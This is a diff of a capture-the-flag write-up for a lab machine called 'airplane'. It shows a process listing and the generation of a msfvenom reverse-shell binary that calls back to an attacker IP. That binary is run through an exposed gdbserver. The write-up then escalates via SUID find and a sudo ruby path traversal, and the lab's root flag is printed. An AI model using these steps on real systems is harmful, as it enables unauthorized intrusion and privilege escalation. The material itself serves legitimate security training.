@@ -438,127 +438,125 @@ done
 
 I changed the i to max 800 beacause you don't need that much.
 
-
 ```bash
-❯ bash get-process.sh 
-1 : /sbin/init splash 
-222 : /lib/systemd/systemd-journald 
-262 : /lib/systemd/systemd-udevd 
-292 : /lib/systemd/systemd-networkd 
-299 : /lib/systemd/systemd-timesyncd 
-304 : /lib/systemd/systemd-resolved 
-308 : /lib/systemd/systemd-timesyncd 
-363 : /usr/lib/accountsservice/accounts-daemon 
-364 : /usr/sbin/acpid 
-367 : avahi-daemon: running [airplane.local] 
-368 : /usr/sbin/cron -f 
-370 : /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
-372 : /usr/sbin/NetworkManager --no-daemon 
-381 : /usr/sbin/irqbalance --foreground 
-383 : /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
-384 : /usr/lib/policykit-1/polkitd --no-debug 
-387 : /usr/sbin/rsyslogd -n -iNONE 
-389 : /usr/lib/snapd/snapd 
-390 : /usr/libexec/switcheroo-control 
-392 : /lib/systemd/systemd-logind 
-393 : /usr/lib/udisks2/udisksd 
-394 : /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant 
-411 : /usr/sbin/irqbalance --foreground 
-432 : avahi-daemon: chroot helper 
-439 : /usr/sbin/rsyslogd -n -iNONE 
-440 : /usr/sbin/rsyslogd -n -iNONE 
-441 : /usr/sbin/rsyslogd -n -iNONE 
-442 : /usr/lib/accountsservice/accounts-daemon 
-443 : /usr/lib/policykit-1/polkitd --no-debug 
-444 : /usr/libexec/switcheroo-control 
-466 : /usr/lib/udisks2/udisksd 
-476 : /usr/sbin/cupsd -l 
-486 : /usr/lib/snapd/snapd 
-487 : /usr/lib/snapd/snapd 
-488 : /usr/lib/snapd/snapd 
-489 : /usr/lib/snapd/snapd 
-490 : /usr/libexec/switcheroo-control 
-492 : /usr/lib/policykit-1/polkitd --no-debug 
-493 : /usr/lib/udisks2/udisksd 
-494 : /usr/lib/accountsservice/accounts-daemon 
-495 : /usr/sbin/cups-browsed 
-516 : /usr/sbin/ModemManager 
-519 : /usr/sbin/cups-browsed 
-520 : /usr/sbin/cups-browsed 
-526 : /usr/sbin/NetworkManager --no-daemon 
-527 : /usr/sbin/NetworkManager --no-daemon 
-532 : /usr/bin/gdbserver 0.0.0.0:6048 airplane 
-534 : /usr/bin/python3 app.py 
-537 : /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal 
-544 : /usr/sbin/ModemManager 
-545 : /usr/lib/udisks2/udisksd 
-551 : sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
-552 : /usr/bin/amazon-ssm-agent 
-555 : /usr/bin/whoopsie -f 
-560 : /usr/sbin/ModemManager 
-566 : /usr/lib/udisks2/udisksd 
-570 : /opt/airplane 
-571 : /usr/sbin/kerneloops --test 
-573 : /usr/sbin/kerneloops 
-574 : /usr/bin/whoopsie -f 
-575 : /usr/bin/whoopsie -f 
-578 : /usr/lib/snapd/snapd 
-579 : /usr/lib/snapd/snapd 
-580 : /usr/lib/snapd/snapd 
-603 : /usr/bin/amazon-ssm-agent 
-604 : /usr/bin/amazon-ssm-agent 
-605 : /usr/bin/amazon-ssm-agent 
-606 : /usr/bin/amazon-ssm-agent 
-624 : /usr/bin/amazon-ssm-agent 
-625 : /usr/bin/amazon-ssm-agent 
-626 : /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal 
-627 : /usr/bin/amazon-ssm-agent 
-646 : /usr/sbin/gdm3 
-657 : /usr/sbin/gdm3 
-658 : /usr/sbin/gdm3 
-666 : /lib/systemd/systemd --user 
-667 : (sd-pam) 
-675 : /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
-680 : /usr/libexec/rtkit-daemon 
-681 : /usr/libexec/rtkit-daemon 
-682 : /usr/libexec/rtkit-daemon 
-712 : gdm-session-worker [pam/gdm-launch-environment] 
-715 : gdm-session-worker [pam/gdm-launch-environment] 
-716 : gdm-session-worker [pam/gdm-launch-environment] 
-722 : /usr/lib/gdm3/gdm-x-session dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart 
-728 : /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220 
-731 : /usr/lib/gdm3/gdm-x-session dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart 
-732 : /usr/lib/xorg/Xorg vt1 -displayfd 3 -auth /run/user/126/gdm/Xauthority -background none -noreset -keeptty -verbose 3 
-737 : /usr/lib/xorg/Xorg vt1 -displayfd 3 -auth /run/user/126/gdm/Xauthority -background none -noreset -keeptty -verbose 3 
-738 : /usr/lib/gdm3/gdm-x-session dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart 
-740 : dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart 
-741 : dbus-daemon --nofork --print-address 4 --session 
-742 : /usr/libexec/gnome-session-binary --systemd --autostart /usr/share/gdm/greeter/autostart 
-746 : /usr/libexec/at-spi-bus-launcher 
-747 : /usr/libexec/at-spi-bus-launcher 
-748 : /usr/libexec/at-spi-bus-launcher 
-750 : /usr/libexec/at-spi-bus-launcher 
-751 : /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3 
-764 : /usr/libexec/gnome-session-binary --systemd --autostart /usr/share/gdm/greeter/autostart 
-765 : /usr/libexec/gnome-session-binary --systemd --autostart /usr/share/gdm/greeter/autostart 
-768 : /usr/libexec/gnome-session-binary --systemd --autostart /usr/share/gdm/greeter/autostart 
+❯ bash get-process.sh
+1 : /sbin/init splash
+222 : /lib/systemd/systemd-journald
+262 : /lib/systemd/systemd-udevd
+292 : /lib/systemd/systemd-networkd
+299 : /lib/systemd/systemd-timesyncd
+304 : /lib/systemd/systemd-resolved
+308 : /lib/systemd/systemd-timesyncd
+363 : /usr/lib/accountsservice/accounts-daemon
+364 : /usr/sbin/acpid
+367 : avahi-daemon: running [airplane.local]
+368 : /usr/sbin/cron -f
+370 : /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+372 : /usr/sbin/NetworkManager --no-daemon
+381 : /usr/sbin/irqbalance --foreground
+383 : /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+384 : /usr/lib/policykit-1/polkitd --no-debug
+387 : /usr/sbin/rsyslogd -n -iNONE
+389 : /usr/lib/snapd/snapd
+390 : /usr/libexec/switcheroo-control
+392 : /lib/systemd/systemd-logind
+393 : /usr/lib/udisks2/udisksd
+394 : /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
+411 : /usr/sbin/irqbalance --foreground
+432 : avahi-daemon: chroot helper
+439 : /usr/sbin/rsyslogd -n -iNONE
+440 : /usr/sbin/rsyslogd -n -iNONE
+441 : /usr/sbin/rsyslogd -n -iNONE
+442 : /usr/lib/accountsservice/accounts-daemon
+443 : /usr/lib/policykit-1/polkitd --no-debug
+444 : /usr/libexec/switcheroo-control
+466 : /usr/lib/udisks2/udisksd
+476 : /usr/sbin/cupsd -l
+486 : /usr/lib/snapd/snapd
+487 : /usr/lib/snapd/snapd
+488 : /usr/lib/snapd/snapd
+489 : /usr/lib/snapd/snapd
+490 : /usr/libexec/switcheroo-control
+492 : /usr/lib/policykit-1/polkitd --no-debug
+493 : /usr/lib/udisks2/udisksd
+494 : /usr/lib/accountsservice/accounts-daemon
+495 : /usr/sbin/cups-browsed
+516 : /usr/sbin/ModemManager
+519 : /usr/sbin/cups-browsed
+520 : /usr/sbin/cups-browsed
+526 : /usr/sbin/NetworkManager --no-daemon
+527 : /usr/sbin/NetworkManager --no-daemon
+532 : /usr/bin/gdbserver 0.0.0.0:6048 airplane
+534 : /usr/bin/python3 app.py
+537 : /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
+544 : /usr/sbin/ModemManager
+545 : /usr/lib/udisks2/udisksd
+551 : sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+552 : /usr/bin/amazon-ssm-agent
+555 : /usr/bin/whoopsie -f
+560 : /usr/sbin/ModemManager
+566 : /usr/lib/udisks2/udisksd
+570 : /opt/airplane
+571 : /usr/sbin/kerneloops --test
+573 : /usr/sbin/kerneloops
+574 : /usr/bin/whoopsie -f
+575 : /usr/bin/whoopsie -f
+578 : /usr/lib/snapd/snapd
+579 : /usr/lib/snapd/snapd
+580 : /usr/lib/snapd/snapd
+603 : /usr/bin/amazon-ssm-agent
+604 : /usr/bin/amazon-ssm-agent
+605 : /usr/bin/amazon-ssm-agent
+606 : /usr/bin/amazon-ssm-agent
+624 : /usr/bin/amazon-ssm-agent
+625 : /usr/bin/amazon-ssm-agent
+626 : /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
+627 : /usr/bin/amazon-ssm-agent
+646 : /usr/sbin/gdm3
+657 : /usr/sbin/gdm3
+658 : /usr/sbin/gdm3
+666 : /lib/systemd/systemd --user
+667 : (sd-pam)
+675 : /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+680 : /usr/libexec/rtkit-daemon
+681 : /usr/libexec/rtkit-daemon
+682 : /usr/libexec/rtkit-daemon
+712 : gdm-session-worker [pam/gdm-launch-environment]
+715 : gdm-session-worker [pam/gdm-launch-environment]
+716 : gdm-session-worker [pam/gdm-launch-environment]
+722 : /usr/lib/gdm3/gdm-x-session dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart
+728 : /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
+731 : /usr/lib/gdm3/gdm-x-session dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart
+732 : /usr/lib/xorg/Xorg vt1 -displayfd 3 -auth /run/user/126/gdm/Xauthority -background none -noreset -keeptty -verbose 3
+737 : /usr/lib/xorg/Xorg vt1 -displayfd 3 -auth /run/user/126/gdm/Xauthority -background none -noreset -keeptty -verbose 3
+738 : /usr/lib/gdm3/gdm-x-session dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart
+740 : dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart
+741 : dbus-daemon --nofork --print-address 4 --session
+742 : /usr/libexec/gnome-session-binary --systemd --autostart /usr/share/gdm/greeter/autostart
+746 : /usr/libexec/at-spi-bus-launcher
+747 : /usr/libexec/at-spi-bus-launcher
+748 : /usr/libexec/at-spi-bus-launcher
+750 : /usr/libexec/at-spi-bus-launcher
+751 : /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
+764 : /usr/libexec/gnome-session-binary --systemd --autostart /usr/share/gdm/greeter/autostart
+765 : /usr/libexec/gnome-session-binary --systemd --autostart /usr/share/gdm/greeter/autostart
+768 : /usr/libexec/gnome-session-binary --systemd --autostart /usr/share/gdm/greeter/autostart
 ```
 
 There is whoopsie binary and
 Also in 532th line gdbserver is running.
-532 : /usr/bin/gdbserver 0.0.0.0:6048 airplane 
+532 : /usr/bin/gdbserver 0.0.0.0:6048 airplane
 
 Finally I can use this port to get reverse shell.
 
 Firstly connect to the gdbserver using:
 
 ```bash
-❯ gdb         
+❯ gdb
 (gdb) target remote 10.10.77.146:6048
 ```
 
 We firstly need to generate reverse shell binary using metasploit. I like to use docker to make that binary.
-
 
 ```bash
 ❯ docker run --rm -it -v $PWD:/data parrotsec/metasploit
@@ -579,9 +577,8 @@ We firstly need to generate reverse shell binary using metasploit. I like to use
 
 Metasploit Documentation: https://docs.metasploit.com/
 
-me[msf](Jobs:0 Agents:0) >>  
+me[msf](Jobs:0 Agents:0) >>
 ```
-
 
 ```bash
 [msf](Jobs:0 Agents:0) >> msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.21.206.128 LPORT=4444 PrependFork=true -f elf -o binary.elf
@@ -600,15 +597,13 @@ Saved as: binary.elf
 binary.elf
 ```
 
-
 Now we can use that binary to get reverse shell.
 
 ```bash
-❯ gdb                    
+❯ gdb
 Remote debugging using airplane.thm:6048
-(gdb) 
+(gdb)
 ```
-
 
 ```bash
 (gdb) target extended-remote airplane.thm:6048
@@ -617,7 +612,7 @@ Remote debugging using airplane.thm:6048
 Successfully sent file "binary.elf".
 (gdb) set remote exec-file /tmp/binary.elf
 (gdb) r
-Starting program:  
+Starting program:
 Reading /tmp/binary.elf from remote target...
 warning: File transfers from remote targets can be slow. Use "set sysroot" to access files locally instead.
 Reading /tmp/binary.elf from remote target...
@@ -631,9 +626,8 @@ Debuginfod has been enabled.
 To make this setting permanent, add 'set debuginfod enabled on' to .gdbinit.
 [Detaching after fork from child process 46409]
 [Inferior 1 (process 46408) exited normally]
-(gdb) 
+(gdb)
 ```
-
 
 And I got the reverse shell lets quickly upgrade that shell.
 
@@ -645,8 +639,104 @@ stty raw -echo;fg
 reset
 ```
 
-
 ```bash
 hudson@airplane:/opt$ whoami
 hudson
 ```
+
+```bash
+hudson@airplane:/home$ find / -type f -perm /4000 2>/dev/null
+/usr/bin/find
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/fusermount
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/su
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/mount
+/usr/sbin/pppd
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+```
+
+What find has suid. Lets go to the <https://gtfobins.github.io/gtfobins/find/>
+
+And use command
+
+```bash
+hudson@airplane:/tmp$ find . -exec /bin/sh -p \; -quit
+$ whoami
+carlos
+```
+
+```bash
+$ ls -la
+total 80
+drwxr-x--- 16 carlos carlos 4096 Apr 17  2024 .
+drwxr-xr-x  4 root   root   4096 Apr 17  2024 ..
+lrwxrwxrwx  1 root   root      9 Apr 17  2024 .bash_history -> /dev/null
+-rw-r--r--  1 carlos carlos  220 Apr 17  2024 .bash_logout
+-rw-r--r--  1 carlos carlos 3771 Apr 17  2024 .bashrc
+drwxrwxr-x 13 carlos carlos 4096 Apr 17  2024 .cache
+drwx------ 11 carlos carlos 4096 Apr 17  2024 .config
+drwx------  3 carlos carlos 4096 Apr 17  2024 .gnupg
+drwxr-xr-x  3 carlos carlos 4096 Apr 17  2024 .local
+drwx------  4 carlos carlos 4096 Apr 17  2024 .mozilla
+-rw-r--r--  1 carlos carlos  807 Apr 17  2024 .profile
+drwx------  2 carlos carlos 4096 Apr 17  2024 .ssh
+-rw-r--r--  1 carlos carlos    0 Apr 17  2024 .sudo_as_admin_successful
+drwxr-x---  2 carlos carlos 4096 Apr 17  2024 Desktop
+drwxr-x---  2 carlos carlos 4096 Apr 17  2024 Documents
+drwxr-x---  2 carlos carlos 4096 Apr 17  2024 Downloads
+drwxr-x---  2 carlos carlos 4096 Apr 17  2024 Music
+drwxr-x---  2 carlos carlos 4096 Apr 17  2024 Pictures
+drwxr-x---  2 carlos carlos 4096 Apr 17  2024 Public
+drwxr-x---  2 carlos carlos 4096 Apr 17  2024 Templates
+drwxr-x---  2 carlos carlos 4096 Apr 17  2024 Videos
+-rw-rw-r--  1 carlos carlos   33 Apr 17  2024 user.txt
+$ cat user.txt
+*******************************
+```
+
+But I don't want to upgrade shell this time lets add out ssh public key and connect using ssh.
+
+```bash
+❯ ssh carlos$IP
+carlos@airplane:~$
+```
+
+```bash
+carlos@airplane:~$ sudo -l
+Matching Defaults entries for carlos on airplane:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User carlos may run the following commands on airplane:
+    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
+```
+
+We can use path traversal on this too.
+
+Firstly make a ruby code which gives shell.
+
+```bash
+carlos@airplane:~$ echo 'exec "/bin/sh"' > /tmp/shell.rb
+carlos@airplane:~$ sudo /usr/bin/ruby /root/../tmp/shell.rb
+whoami
+root
+ls /root
+root.txt  snap
+cat /root/root.txt
+190dcbeb688ce5fe029f26a1e5fce002
+```
+
+Nothing we can use I think.
